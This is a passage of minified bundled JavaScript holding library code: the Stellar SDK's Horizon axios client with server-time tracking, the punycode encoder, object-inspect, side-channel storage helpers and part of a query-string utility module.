    axios$2.exports.default = b,
    axios$2.exports
}
var axios$1, hasRequiredAxios;
function requireAxios() {
    return hasRequiredAxios || (hasRequiredAxios = 1,
    axios$1 = requireAxios$1()),
    axios$1
}
var hasRequiredHorizon_axios_client;
function requireHorizon_axios_client() {
    return hasRequiredHorizon_axios_client || (hasRequiredHorizon_axios_client = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.getCurrentServerTime = _.SERVER_TIME_MAP = void 0;
        var M = require$$0$2
          , j = M.__importDefault(requireAxios())
          , O = M.__importDefault(requireURI())
          , x = require$$2.version;
        _.SERVER_TIME_MAP = {};
        var w = j.default.create({
            headers: {
                "X-Client-Name": "js-stellar-sdk",
                "X-Client-Version": x
            }
        });
        function b(Y) {
            return Math.floor(Y / 1e3)
        }
        w.interceptors.response.use(function(F) {
            var V = O.default(F.config.url).hostname()
              , K = b(Date.parse(F.headers.date))
              , Q = b(new Date().getTime());
            return isNaN(K) || (_.SERVER_TIME_MAP[V] = {
                serverTime: K,
                localTimeRecorded: Q
            }),
            F
        }),
        _.default = w;
        function X(Y) {
            var F = _.SERVER_TIME_MAP[Y];
            if (!F || !F.localTimeRecorded || !F.serverTime)
                return null;
            var V = F.serverTime
              , K = F.localTimeRecorded
              , Q = b(new Date().getTime());
            return Q - K > 60 * 5 ? null : Q - K + V
        }
        _.getCurrentServerTime = X
    }(horizon_axios_client)),
    horizon_axios_client
}
var punycode$2 = {
    exports: {}
};
/*! https://mths.be/punycode v1.4.1 by @mathias */
var punycode$1 = punycode$2.exports, hasRequiredPunycode;
function requirePunycode() {
    return hasRequiredPunycode || (hasRequiredPunycode = 1,
    function(_, M) {
        (function(j) {
            var O = M && !M.nodeType && M
              , x = _ && !_.nodeType && _
              , w = typeof window == "object" && window;
            (w.global === w || w.window === w || w.self === w) && (j = w);
            var b, X = 2147483647, Y = 36, F = 1, V = 26, K = 38, Q = 700, ee = 72, ae = 128, ne = "-", oe = /^xn--/, ue = /[^\x20-\x7E]/, fe = /[\x2E\u3002\uFF0E\uFF61]/g, he = {
                overflow: "Overflow: input needs wider integers to process",
                "not-basic": "Illegal input >= 0x80 (not a basic code point)",
                "invalid-input": "Invalid input"
            }, pe = Y - F, ye = Math.floor, be = String.fromCharCode, xe;
            function Ae($) {
                throw new RangeError(he[$])
            }
            function Ee($, ie) {
                for (var ve = $.length, ge = []; ve--; )
                    ge[ve] = ie($[ve]);
                return ge
            }
            function Be($, ie) {
                var ve = $.split("@")
                  , ge = "";
                ve.length > 1 && (ge = ve[0] + "@",
                $ = ve[1]),
                $ = $.replace(fe, ".");
                var Re = $.split(".")
                  , Pe = Ee(Re, ie).join(".");
                return ge + Pe
            }
            function ce($) {
                for (var ie = [], ve = 0, ge = $.length, Re, Pe; ve < ge; )
                    Re = $.charCodeAt(ve++),
                    Re >= 55296 && Re <= 56319 && ve < ge ? (Pe = $.charCodeAt(ve++),
                    (Pe & 64512) == 56320 ? ie.push(((Re & 1023) << 10) + (Pe & 1023) + 65536) : (ie.push(Re),
                    ve--)) : ie.push(Re);
                return ie
            }
            function q($) {
                return Ee($, function(ie) {
                    var ve = "";
                    return ie > 65535 && (ie -= 65536,
                    ve += be(ie >>> 10 & 1023 | 55296),
                    ie = 56320 | ie & 1023),
                    ve += be(ie),
                    ve
                }).join("")
            }
            function L($) {
                return $ - 48 < 10 ? $ - 22 : $ - 65 < 26 ? $ - 65 : $ - 97 < 26 ? $ - 97 : Y
            }
            function U($, ie) {
                return $ + 22 + 75 * ($ < 26) - ((ie != 0) << 5)
            }
            function Z($, ie, ve) {
                var ge = 0;
                for ($ = ve ? ye($ / Q) : $ >> 1,
                $ += ye($ / ie); $ > pe * V >> 1; ge += Y)
                    $ = ye($ / pe);
                return ye(ge + (pe + 1) * $ / ($ + K))
            }
            function te($) {
                var ie = [], ve = $.length, ge, Re = 0, Pe = ae, Ie = ee, Te, Le, Ze, $e, Ne, qe, Ve, lt, nt;
                for (Te = $.lastIndexOf(ne),
                Te < 0 && (Te = 0),
                Le = 0; Le < Te; ++Le)
                    $.charCodeAt(Le) >= 128 && Ae("not-basic"),
                    ie.push($.charCodeAt(Le));
                for (Ze = Te > 0 ? Te + 1 : 0; Ze < ve; ) {
                    for ($e = Re,
                    Ne = 1,
                    qe = Y; Ze >= ve && Ae("invalid-input"),
                    Ve = L($.charCodeAt(Ze++)),
                    (Ve >= Y || Ve > ye((X - Re) / Ne)) && Ae("overflow"),
                    Re += Ve * Ne,
                    lt = qe <= Ie ? F : qe >= Ie + V ? V : qe - Ie,
                    !(Ve < lt); qe += Y)
                        nt = Y - lt,
                        Ne > ye(X / nt) && Ae("overflow"),
                        Ne *= nt;
                    ge = ie.length + 1,
                    Ie = Z(Re - $e, ge, $e == 0),
                    ye(Re / ge) > X - Pe && Ae("overflow"),
                    Pe += ye(Re / ge),
                    Re %= ge,
                    ie.splice(Re++, 0, Pe)
                }
                return q(ie)
            }
            function se($) {
                var ie, ve, ge, Re, Pe, Ie, Te, Le, Ze, $e, Ne, qe = [], Ve, lt, nt, je;
                for ($ = ce($),
                Ve = $.length,
                ie = ae,
                ve = 0,
                Pe = ee,
                Ie = 0; Ie < Ve; ++Ie)
                    Ne = $[Ie],
                    Ne < 128 && qe.push(be(Ne));
                for (ge = Re = qe.length,
                Re && qe.push(ne); ge < Ve; ) {
                    for (Te = X,
                    Ie = 0; Ie < Ve; ++Ie)
                        Ne = $[Ie],
                        Ne >= ie && Ne < Te && (Te = Ne);
                    for (lt = ge + 1,
                    Te - ie > ye((X - ve) / lt) && Ae("overflow"),
                    ve += (Te - ie) * lt,
                    ie = Te,
                    Ie = 0; Ie < Ve; ++Ie)
                        if (Ne = $[Ie],
                        Ne < ie && ++ve > X && Ae("overflow"),
                        Ne == ie) {
                            for (Le = ve,
                            Ze = Y; $e = Ze <= Pe ? F : Ze >= Pe + V ? V : Ze - Pe,
                            !(Le < $e); Ze += Y)
                                je = Le - $e,
                                nt = Y - $e,
                                qe.push(be(U($e + je % nt, 0))),
                                Le = ye(je / nt);
                            qe.push(be(U(Le, 0))),
                            Pe = Z(ve, lt, ge == Re),
                            ve = 0,
                            ++ge
                        }
                    ++ve,
                    ++ie
                }
                return qe.join("")
            }
            function de($) {
                return Be($, function(ie) {
                    return oe.test(ie) ? te(ie.slice(4).toLowerCase()) : ie
                })
            }
            function re($) {
                return Be($, function(ie) {
                    return ue.test(ie) ? "xn--" + se(ie) : ie
                })
            }
            if (b = {
                version: "1.4.1",
                ucs2: {
                    decode: ce,
                    encode: q
                },
                decode: te,
                encode: se,
                toASCII: re,
                toUnicode: de
            },
            O && x)
                if (_.exports == O)
                    x.exports = b;
                else
                    for (xe in b)
                        b.hasOwnProperty(xe) && (O[xe] = b[xe]);
            else
                j.punycode = b
        }
        )(punycode$1)
    }(punycode$2, punycode$2.exports)),
    punycode$2.exports
}
var punycodeExports = requirePunycode();
const require$$0 = getDefaultExportFromCjs$1(punycodeExports);
var objectInspect, hasRequiredObjectInspect;
function requireObjectInspect() {
    if (hasRequiredObjectInspect)
        return objectInspect;
    hasRequiredObjectInspect = 1;
    var _ = typeof Map == "function" && Map.prototype
      , M = Object.getOwnPropertyDescriptor && _ ? Object.getOwnPropertyDescriptor(Map.prototype, "size") : null
      , j = _ && M && typeof M.get == "function" ? M.get : null
      , O = _ && Map.prototype.forEach
      , x = typeof Set == "function" && Set.prototype
      , w = Object.getOwnPropertyDescriptor && x ? Object.getOwnPropertyDescriptor(Set.prototype, "size") : null
      , b = x && w && typeof w.get == "function" ? w.get : null
      , X = x && Set.prototype.forEach
      , Y = typeof WeakMap == "function" && WeakMap.prototype
      , F = Y ? WeakMap.prototype.has : null
      , V = typeof WeakSet == "function" && WeakSet.prototype
      , K = V ? WeakSet.prototype.has : null
      , Q = typeof WeakRef == "function" && WeakRef.prototype
      , ee = Q ? WeakRef.prototype.deref : null
      , ae = Boolean.prototype.valueOf
      , ne = Object.prototype.toString
      , oe = Function.prototype.toString
      , ue = String.prototype.match
      , fe = String.prototype.slice
      , he = String.prototype.replace
      , pe = String.prototype.toUpperCase
      , ye = String.prototype.toLowerCase
      , be = RegExp.prototype.test
      , xe = Array.prototype.concat
      , Ae = Array.prototype.join
      , Ee = Array.prototype.slice
      , Be = Math.floor
      , ce = typeof BigInt == "function" ? BigInt.prototype.valueOf : null
      , q = Object.getOwnPropertySymbols
      , L = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? Symbol.prototype.toString : null
      , U = typeof Symbol == "function" && typeof Symbol.iterator == "object"
      , Z = typeof Symbol == "function" && Symbol.toStringTag && (typeof Symbol.toStringTag === U || !0) ? Symbol.toStringTag : null
      , te = Object.prototype.propertyIsEnumerable
      , se = (typeof Reflect == "function" ? Reflect.getPrototypeOf : Object.getPrototypeOf) || ([].__proto__ === Array.prototype ? function(ft) {
        return ft.__proto__
    }
    : null);
    function de(ft, gt) {
        if (ft === 1 / 0 || ft === -1 / 0 || ft !== ft || ft && ft > -1e3 && ft < 1e3 || be.call(/e/, gt))
            return gt;
        var Yt = /[0-9](?=(?:[0-9]{3})+(?![0-9]))/g;
        if (typeof ft == "number") {
            var Ct = ft < 0 ? -Be(-ft) : Be(ft);
            if (Ct !== ft) {
                var Ot = String(Ct)
                  , Vt = fe.call(gt, Ot.length + 1);
                return he.call(Ot, Yt, "$&_") + "." + he.call(he.call(Vt, /([0-9]{3})/g, "$&_"), /_$/, "")
            }
        }
        return he.call(gt, Yt, "$&_")
    }
    var re = require$$0$1
      , $ = re.custom
      , ie = lt($) ? $ : null
      , ve = {
        __proto__: null,
        double: '"',
        single: "'"
    }
      , ge = {
        __proto__: null,
        double: /(["\\])/g,
        single: /(['\\])/g
    };
    objectInspect = function ft(gt, Yt, Ct, Ot) {
        var Vt = Yt || {};
        if (Ke(Vt, "quoteStyle") && !Ke(ve, Vt.quoteStyle))
            throw new TypeError('option "quoteStyle" must be "single" or "double"');
        if (Ke(Vt, "maxStringLength") && (typeof Vt.maxStringLength == "number" ? Vt.maxStringLength < 0 && Vt.maxStringLength !== 1 / 0 : Vt.maxStringLength !== null))
            throw new TypeError('option "maxStringLength", if provided, must be a positive integer, Infinity, or `null`');
        var Pt = Ke(Vt, "customInspect") ? Vt.customInspect : !0;
        if (typeof Pt != "boolean" && Pt !== "symbol")
            throw new TypeError("option \"customInspect\", if provided, must be `true`, `false`, or `'symbol'`");
        if (Ke(Vt, "indent") && Vt.indent !== null && Vt.indent !== "	" && !(parseInt(Vt.indent, 10) === Vt.indent && Vt.indent > 0))
            throw new TypeError('option "indent" must be "\\t", an integer > 0, or `null`');
        if (Ke(Vt, "numericSeparator") && typeof Vt.numericSeparator != "boolean")
            throw new TypeError('option "numericSeparator", if provided, must be `true` or `false`');
        var Bt = Vt.numericSeparator;
        if (typeof gt > "u")
            return "undefined";
        if (gt === null)
            return "null";
        if (typeof gt == "boolean")
            return gt ? "true" : "false";
        if (typeof gt == "string")
            return et(gt, Vt);
        if (typeof gt == "number") {
            if (gt === 0)
                return 1 / 0 / gt > 0 ? "0" : "-0";
            var xr = String(gt);
            return Bt ? de(gt, xr) : xr
        }
        if (typeof gt == "bigint") {
            var Dt = String(gt) + "n";
            return Bt ? de(gt, Dt) : Dt
        }
        var Ft = typeof Vt.depth > "u" ? 5 : Vt.depth;
        if (typeof Ct > "u" && (Ct = 0),
        Ct >= Ft && Ft > 0 && typeof gt == "object")
            return Te(gt) ? "[Array]" : "[Object]";
        var Mr = rt(Vt, Ct);
        if (typeof Ot > "u")
            Ot = [];
        else if (mt(Ot, gt) >= 0)
            return "[Circular]";
        function at(or, yr, vr) {
            if (yr && (Ot = Ee.call(Ot),
            Ot.push(yr)),
            vr) {
                var gr = {
                    depth: Vt.depth
                };
                return Ke(Vt, "quoteStyle") && (gr.quoteStyle = Vt.quoteStyle),
                ft(or, gr, Ct + 1, Ot)
            }
            return ft(or, Vt, Ct + 1, Ot)
        }
        if (typeof gt == "function" && !Ze(gt)) {
            var ze = We(gt)
              , Je = Et(gt, at);
            return "[Function" + (ze ? ": " + ze : " (anonymous)") + "]" + (Je.length > 0 ? " { " + Ae.call(Je, ", ") + " }" : "")
        }
        if (lt(gt)) {
            var ht = U ? he.call(String(gt), /^(Symbol\(.*\))_[^)]*$/, "$1") : L.call(gt);
            return typeof gt == "object" && !U ? He(ht) : ht
        }
        if (st(gt)) {
            for (var _t = "<" + ye.call(String(gt.nodeName)), Ge = gt.attributes || [], Ye = 0; Ye < Ge.length; Ye++)
                _t += " " + Ge[Ye].name + "=" + Re(Pe(Ge[Ye].value), "double", Vt);
            return _t += ">",
            gt.childNodes && gt.childNodes.length && (_t += "..."),
            _t += "</" + ye.call(String(gt.nodeName)) + ">",
            _t
        }
        if (Te(gt)) {
            if (gt.length === 0)
                return "[]";
            var it = Et(gt, at);
            return Mr && !Ue(it) ? "[" + dt(it, Mr) + "]" : "[ " + Ae.call(it, ", ") + " ]"
        }
        if ($e(gt)) {
            var Fe = Et(gt, at);
            return !("cause"in Error.prototype) && "cause"in gt && !te.call(gt, "cause") ? "{ [" + String(gt) + "] " + Ae.call(xe.call("[cause]: " + at(gt.cause), Fe), ", ") + " }" : Fe.length === 0 ? "[" + String(gt) + "]" : "{ [" + String(gt) + "] " + Ae.call(Fe, ", ") + " }"
        }
        if (typeof gt == "object" && Pt) {
            if (ie && typeof gt[ie] == "function" && re)
                return re(gt, {
                    depth: Ft - Ct
                });
            if (Pt !== "symbol" && typeof gt.inspect == "function")
                return gt.inspect()
        }
        if (ct(gt)) {
            var ut = [];
            return O && O.call(gt, function(or, yr) {
                ut.push(at(yr, gt, !0) + " => " + at(or, gt))
            }),
            Me("Map", j.call(gt), ut, Mr)
        }
        if (_e(gt)) {
            var wt = [];
            return X && X.call(gt, function(or) {
                wt.push(at(or, gt))
            }),
            Me("Set", b.call(gt), wt, Mr)
        }
        if (vt(gt))
            return ke("WeakMap");
        if (Ce(gt))
            return ke("WeakSet");
        if (we(gt))
            return ke("WeakRef");
        if (qe(gt))
            return He(at(Number(gt)));
        if (nt(gt))
            return He(at(ce.call(gt)));
        if (Ve(gt))
            return He(ae.call(gt));
        if (Ne(gt))
            return He(at(String(gt)));
        if (typeof window < "u" && gt === window)
            return "{ [object Window] }";
        if (typeof globalThis < "u" && gt === globalThis || typeof window < "u" && gt === window)
            return "{ [object globalThis] }";
        if (!Le(gt) && !Ze(gt)) {
            var At = Et(gt, at)
              , St = se ? se(gt) === Object.prototype : gt instanceof Object || gt.constructor === Object
              , Tt = gt instanceof Object ? "" : "null prototype"
              , er = !St && Z && Object(gt) === gt && Z in gt ? fe.call(Qe(gt), 8, -1) : Tt ? "Object" : ""
              , Xt = St || typeof gt.constructor != "function" ? "" : gt.constructor.name ? gt.constructor.name + " " : ""
              , pr = Xt + (er || Tt ? "[" + Ae.call(xe.call([], er || [], Tt || []), ": ") + "] " : "");
            return At.length === 0 ? pr + "{}" : Mr ? pr + "{" + dt(At, Mr) + "}" : pr + "{ " + Ae.call(At, ", ") + " }"
        }
        return String(gt)
    }
    ;
    function Re(ft, gt, Yt) {
        var Ct = Yt.quoteStyle || gt
          , Ot = ve[Ct];
        return Ot + ft + Ot
    }
    function Pe(ft) {
        return he.call(String(ft), /"/g, "&quot;")
    }
    function Ie(ft) {
        return !Z || !(typeof ft == "object" && (Z in ft || typeof ft[Z] < "u"))
    }
    function Te(ft) {
        return Qe(ft) === "[object Array]" && Ie(ft)
    }
    function Le(ft) {
        return Qe(ft) === "[object Date]" && Ie(ft)
    }
    function Ze(ft) {
        return Qe(ft) === "[object RegExp]" && Ie(ft)
    }
    function $e(ft) {
        return Qe(ft) === "[object Error]" && Ie(ft)
    }
    function Ne(ft) {
        return Qe(ft) === "[object String]" && Ie(ft)
    }
    function qe(ft) {
        return Qe(ft) === "[object Number]" && Ie(ft)
    }
    function Ve(ft) {
        return Qe(ft) === "[object Boolean]" && Ie(ft)
    }
    function lt(ft) {
        if (U)
            return ft && typeof ft == "object" && ft instanceof Symbol;
        if (typeof ft == "symbol")
            return !0;
        if (!ft || typeof ft != "object" || !L)
            return !1;
        try {
            return L.call(ft),
            !0
        } catch {}
        return !1
    }
    function nt(ft) {
        if (!ft || typeof ft != "object" || !ce)
            return !1;
        try {
            return ce.call(ft),
            !0
        } catch {}
        return !1
    }
    var je = Object.prototype.hasOwnProperty || function(ft) {
        return ft in this
    }
    ;
    function Ke(ft, gt) {
        return je.call(ft, gt)
    }
    function Qe(ft) {
        return ne.call(ft)
    }
    function We(ft) {
        if (ft.name)
            return ft.name;
        var gt = ue.call(oe.call(ft), /^function\s*([\w$]+)/);
        return gt ? gt[1] : null
    }
    function mt(ft, gt) {
        if (ft.indexOf)
            return ft.indexOf(gt);
        for (var Yt = 0, Ct = ft.length; Yt < Ct; Yt++)
            if (ft[Yt] === gt)
                return Yt;
        return -1
    }
    function ct(ft) {
        if (!j || !ft || typeof ft != "object")
            return !1;
        try {
            j.call(ft);
            try {
                b.call(ft)
            } catch {
                return !0
            }
            return ft instanceof Map
        } catch {}
        return !1
    }
    function vt(ft) {
        if (!F || !ft || typeof ft != "object")
            return !1;
        try {
            F.call(ft, F);
            try {
                K.call(ft, K)
            } catch {
                return !0
            }
            return ft instanceof WeakMap
        } catch {}
        return !1
    }
    function we(ft) {
        if (!ee || !ft || typeof ft != "object")
            return !1;
        try {
            return ee.call(ft),
            !0
        } catch {}
        return !1
    }
    function _e(ft) {
        if (!b || !ft || typeof ft != "object")
            return !1;
        try {
            b.call(ft);
            try {
                j.call(ft)
            } catch {
                return !0
            }
            return ft instanceof Set
        } catch {}
        return !1
    }
    function Ce(ft) {
        if (!K || !ft || typeof ft != "object")
            return !1;
        try {
            K.call(ft, K);
            try {
                F.call(ft, F)
            } catch {
                return !0
            }
            return ft instanceof WeakSet
        } catch {}
        return !1
    }
    function st(ft) {
        return !ft || typeof ft != "object" ? !1 : typeof HTMLElement < "u" && ft instanceof HTMLElement ? !0 : typeof ft.nodeName == "string" && typeof ft.getAttribute == "function"
    }
    function et(ft, gt) {
        if (ft.length > gt.maxStringLength) {
            var Yt = ft.length - gt.maxStringLength
              , Ct = "... " + Yt + " more character" + (Yt > 1 ? "s" : "");
            return et(fe.call(ft, 0, gt.maxStringLength), gt) + Ct
        }
        var Ot = ge[gt.quoteStyle || "single"];
        Ot.lastIndex = 0;
        var Vt = he.call(he.call(ft, Ot, "\\$1"), /[\x00-\x1f]/g, tt);
        return Re(Vt, "single", gt)
    }
    function tt(ft) {
        var gt = ft.charCodeAt(0)
          , Yt = {
            8: "b",
            9: "t",
            10: "n",
            12: "f",
            13: "r"
        }[gt];
        return Yt ? "\\" + Yt : "\\x" + (gt < 16 ? "0" : "") + pe.call(gt.toString(16))
    }
    function He(ft) {
        return "Object(" + ft + ")"
    }
    function ke(ft) {
        return ft + " { ? }"
    }
    function Me(ft, gt, Yt, Ct) {
        var Ot = Ct ? dt(Yt, Ct) : Ae.call(Yt, ", ");
        return ft + " (" + gt + ") {" + Ot + "}"
    }
    function Ue(ft) {
        for (var gt = 0; gt < ft.length; gt++)
            if (mt(ft[gt], `
`) >= 0)
                return !1;
        return !0
    }
    function rt(ft, gt) {
        var Yt;
        if (ft.indent === "	")
            Yt = "	";
        else if (typeof ft.indent == "number" && ft.indent > 0)
            Yt = Ae.call(Array(ft.indent + 1), " ");
        else
            return null;
        return {
            base: Yt,
            prev: Ae.call(Array(gt + 1), Yt)
        }
    }
    function dt(ft, gt) {
        if (ft.length === 0)
            return "";
        var Yt = `
` + gt.prev + gt.base;
        return Yt + Ae.call(ft, "," + Yt) + `
` + gt.prev
    }
    function Et(ft, gt) {
        var Yt = Te(ft)
          , Ct = [];
        if (Yt) {
            Ct.length = ft.length;
            for (var Ot = 0; Ot < ft.length; Ot++)
                Ct[Ot] = Ke(ft, Ot) ? gt(ft[Ot], ft) : ""
        }
        var Vt = typeof q == "function" ? q(ft) : [], Pt;
        if (U) {
            Pt = {};
            for (var Bt = 0; Bt < Vt.length; Bt++)
                Pt["$" + Vt[Bt]] = Vt[Bt]
        }
        for (var xr in ft)
            Ke(ft, xr) && (Yt && String(Number(xr)) === xr && xr < ft.length || U && Pt["$" + xr]instanceof Symbol || (be.call(/[^\w$]/, xr) ? Ct.push(gt(xr, ft) + ": " + gt(ft[xr], ft)) : Ct.push(xr + ": " + gt(ft[xr], ft))));
        if (typeof q == "function")
            for (var Dt = 0; Dt < Vt.length; Dt++)
                te.call(ft, Vt[Dt]) && Ct.push("[" + gt(Vt[Dt]) + "]: " + gt(ft[Vt[Dt]], ft));
        return Ct
    }
    return objectInspect
}
var sideChannelList, hasRequiredSideChannelList;
function requireSideChannelList() {
    if (hasRequiredSideChannelList)
        return sideChannelList;
    hasRequiredSideChannelList = 1;
    var _ = requireObjectInspect()
      , M = requireType()
      , j = function(X, Y, F) {
        for (var V = X, K; (K = V.next) != null; V = K)
            if (K.key === Y)
                return V.next = K.next,
                F || (K.next = X.next,
                X.next = K),
                K
    }
      , O = function(X, Y) {
        if (X) {
            var F = j(X, Y);
            return F && F.value
        }
    }
      , x = function(X, Y, F) {
        var V = j(X, Y);
        V ? V.value = F : X.next = {
            key: Y,
            next: X.next,
            value: F
        }
    }
      , w = function(X, Y) {
        return X ? !!j(X, Y) : !1
    }
      , b = function(X, Y) {
        if (X)
            return j(X, Y, !0)
    };
    return sideChannelList = function() {
        var Y, F = {
            assert: function(V) {
                if (!F.has(V))
                    throw new M("Side channel does not contain " + _(V))
            },
            delete: function(V) {
                var K = Y && Y.next
                  , Q = b(Y, V);
                return Q && K && K === Q && (Y = void 0),
                !!Q
            },
            get: function(V) {
                return O(Y, V)
            },
            has: function(V) {
                return w(Y, V)
            },
            set: function(V, K) {
                Y || (Y = {
                    next: void 0
                }),
                x(Y, V, K)
            }
        };
        return F
    }
    ,
    sideChannelList
}
var sideChannelMap, hasRequiredSideChannelMap;
function requireSideChannelMap() {
    if (hasRequiredSideChannelMap)
        return sideChannelMap;
    hasRequiredSideChannelMap = 1;
    var _ = requireGetIntrinsic()
      , M = requireCallBound$1()
      , j = requireObjectInspect()
      , O = requireType()
      , x = _("%Map%", !0)
      , w = M("Map.prototype.get", !0)
      , b = M("Map.prototype.set", !0)
      , X = M("Map.prototype.has", !0)
      , Y = M("Map.prototype.delete", !0)
      , F = M("Map.prototype.size", !0);
    return sideChannelMap = !!x && function() {
        var K, Q = {
            assert: function(ee) {
                if (!Q.has(ee))
                    throw new O("Side channel does not contain " + j(ee))
            },
            delete: function(ee) {
                if (K) {
                    var ae = Y(K, ee);
                    return F(K) === 0 && (K = void 0),
                    ae
                }
                return !1
            },
            get: function(ee) {
                if (K)
                    return w(K, ee)
            },
            has: function(ee) {
                return K ? X(K, ee) : !1
            },
            set: function(ee, ae) {
                K || (K = new x),
                b(K, ee, ae)
            }
        };
        return Q
    }
    ,
    sideChannelMap
}
var sideChannelWeakmap, hasRequiredSideChannelWeakmap;
function requireSideChannelWeakmap() {
    if (hasRequiredSideChannelWeakmap)
        return sideChannelWeakmap;
    hasRequiredSideChannelWeakmap = 1;
    var _ = requireGetIntrinsic()
      , M = requireCallBound$1()
      , j = requireObjectInspect()
      , O = requireSideChannelMap()
      , x = requireType()
      , w = _("%WeakMap%", !0)
      , b = M("WeakMap.prototype.get", !0)
      , X = M("WeakMap.prototype.set", !0)
      , Y = M("WeakMap.prototype.has", !0)
      , F = M("WeakMap.prototype.delete", !0);
    return sideChannelWeakmap = w ? function() {
        var K, Q, ee = {
            assert: function(ae) {
                if (!ee.has(ae))
                    throw new x("Side channel does not contain " + j(ae))
            },
            delete: function(ae) {
                if (w && ae && (typeof ae == "object" || typeof ae == "function")) {
                    if (K)
                        return F(K, ae)
                } else if (O && Q)
                    return Q.delete(ae);
                return !1
            },
            get: function(ae) {
                return w && ae && (typeof ae == "object" || typeof ae == "function") && K ? b(K, ae) : Q && Q.get(ae)
            },
            has: function(ae) {
                return w && ae && (typeof ae == "object" || typeof ae == "function") && K ? Y(K, ae) : !!Q && Q.has(ae)
            },
            set: function(ae, ne) {
                w && ae && (typeof ae == "object" || typeof ae == "function") ? (K || (K = new w),
                X(K, ae, ne)) : O && (Q || (Q = O()),
                Q.set(ae, ne))
            }
        };
        return ee
    }
    : O,
    sideChannelWeakmap
}
var sideChannel, hasRequiredSideChannel;
function requireSideChannel() {
    if (hasRequiredSideChannel)
        return sideChannel;
    hasRequiredSideChannel = 1;
    var _ = requireType()
      , M = requireObjectInspect()
      , j = requireSideChannelList()
      , O = requireSideChannelMap()
      , x = requireSideChannelWeakmap()
      , w = x || O || j;
    return sideChannel = function() {
        var X, Y = {
            assert: function(F) {
                if (!Y.has(F))
                    throw new _("Side channel does not contain " + M(F))
            },
            delete: function(F) {
                return !!X && X.delete(F)
            },
            get: function(F) {
                return X && X.get(F)
            },
            has: function(F) {
                return !!X && X.has(F)
            },
            set: function(F, V) {
                X || (X = w()),
                X.set(F, V)
            }
        };
        return Y
    }
    ,
    sideChannel
}
var formats, hasRequiredFormats;
function requireFormats() {
    if (hasRequiredFormats)
        return formats;
    hasRequiredFormats = 1;
    var _ = String.prototype.replace
      , M = /%20/g
      , j = {
        RFC1738: "RFC1738",
        RFC3986: "RFC3986"
    };
    return formats = {
        default: j.RFC3986,
        formatters: {
            RFC1738: function(O) {
                return _.call(O, M, "+")
            },
            RFC3986: function(O) {
                return String(O)
            }
        },
        RFC1738: j.RFC1738,
        RFC3986: j.RFC3986
    },
    formats
}
var utils$3, hasRequiredUtils$1;
function requireUtils$1() {
    if (hasRequiredUtils$1)
        return utils$3;
    hasRequiredUtils$1 = 1;
    var _ = requireFormats()
      , M = Object.prototype.hasOwnProperty
      , j = Array.isArray
      , O = function() {
        for (var oe = [], ue = 0; ue < 256; ++ue)
            oe.push("%" + ((ue < 16 ? "0" : "") + ue.toString(16)).toUpperCase());
        return oe
    }()
      , x = function(ue) {
        for (; ue.length > 1; ) {
            var fe = ue.pop()
              , he = fe.obj[fe.prop];
            if (j(he)) {
                for (var pe = [], ye = 0; ye < he.length; ++ye)
                    typeof he[ye] < "u" && pe.push(he[ye]);
                fe.obj[fe.prop] = pe
            }
        }
    }
      , w = function(ue, fe) {
        for (var he = fe && fe.plainObjects ? {
            __proto__: null
        } : {}, pe = 0; pe < ue.length; ++pe)
            typeof ue[pe] < "u" && (he[pe] = ue[pe]);
        return he
    }
      , b = function oe(ue, fe, he) {
        if (!fe)
            return ue;
        if (typeof fe != "object" && typeof fe != "function") {
            if (j(ue))
                ue.push(fe);
            else if (ue && typeof ue == "object")
                (he && (he.plainObjects || he.allowPrototypes) || !M.call(Object.prototype, fe)) && (ue[fe] = !0);
            else
                return [ue, fe];
            return ue
        }
        if (!ue || typeof ue != "object")
            return [ue].concat(fe);
        var pe = ue;
        return j(ue) && !j(fe) && (pe = w(ue, he)),
        j(ue) && j(fe) ? (fe.forEach(function(ye, be) {
            if (M.call(ue, be)) {
                var xe = ue[be];
                xe && typeof xe == "object" && ye && typeof ye == "object" ? ue[be] = oe(xe, ye, he) : ue.push(ye)
            } else
                ue[be] = ye
        }),
        ue) : Object.keys(fe).reduce(function(ye, be) {
            var xe = fe[be];
            return M.call(ye, be) ? ye[be] = oe(ye[be], xe, he) : ye[be] = xe,
            ye
        }, pe)
    }
      , X = function(ue, fe) {
        return Object.keys(fe).reduce(function(he, pe) {
            return he[pe] = fe[pe],
            he
        }, ue)
    }
      , Y = function(oe, ue, fe) {
        var he = oe.replace(/\+/g, " ");
        if (fe === "iso-8859-1")
            return he.replace(/%[0-9a-f]{2}/gi, unescape);
        try {
            return decodeURIComponent(he)
        } catch {
            return he
        }
    }
      , F = 1024
      , V = function(ue, fe, he, pe, ye) {
        if (ue.length === 0)
            return ue;
        var be = ue;
        if (typeof ue == "symbol" ? be = Symbol.prototype.toString.call(ue) : typeof ue != "string" && (be = String(ue)),
        he === "iso-8859-1")
            return escape(be).replace(/%u[0-9a-f]{4}/gi, function(L) {
                return "%26%23" + parseInt(L.slice(2), 16) + "%3B"
            });
        for (var xe = "", Ae = 0; Ae < be.length; Ae += F) {
            for (var Ee = be.length >= F ? be.slice(Ae, Ae + F) : be, Be = [], ce = 0; ce < Ee.length; ++ce) {
                var q = Ee.charCodeAt(ce);
                if (q === 45 || q === 46 || q === 95 || q === 126 || q >= 48 && q <= 57 || q >= 65 && q <= 90 || q >= 97 && q <= 122 || ye === _.RFC1738 && (q === 40 || q === 41)) {
                    Be[Be.length] = Ee.charAt(ce);
                    continue
                }
                if (q < 128) {
                    Be[Be.length] = O[q];
                    continue
                }
                if (q < 2048) {
                    Be[Be.length] = O[192 | q >> 6] + O[128 | q & 63];
                    continue
                }
                if (q < 55296 || q >= 57344) {
                    Be[Be.length] = O[224 | q >> 12] + O[128 | q >> 6 & 63] + O[128 | q & 63];
                    continue
                }
                ce += 1,
                q = 65536 + ((q & 1023) << 10 | Ee.charCodeAt(ce) & 1023),
                Be[Be.length] = O[240 | q >> 18] + O[128 | q >> 12 & 63] + O[128 | q >> 6 & 63] + O[128 | q & 63]
            }
            xe += Be.join("")
        }
        return xe
    }
      , K = function(ue) {
        for (var fe = [{
            obj: {
                o: ue
            },
            prop: "o"
        }], he = [], pe = 0; pe < fe.length; ++pe)
            for (var ye = fe[pe], be = ye.obj[ye.prop], xe = Object.keys(be), Ae = 0; Ae < xe.length; ++Ae) {
                var Ee = xe[Ae]
                  , Be = be[Ee];
                typeof Be == "object" && Be !== null && he.indexOf(Be) === -1 && (fe.push({
                    obj: be,
                    prop: Ee
                }),
                he.push(Be))
            }
        return x(fe),
        ue
    }
      , Q = function(ue) {
        return Object.prototype.toString.call(ue) === "[object RegExp]"
    }
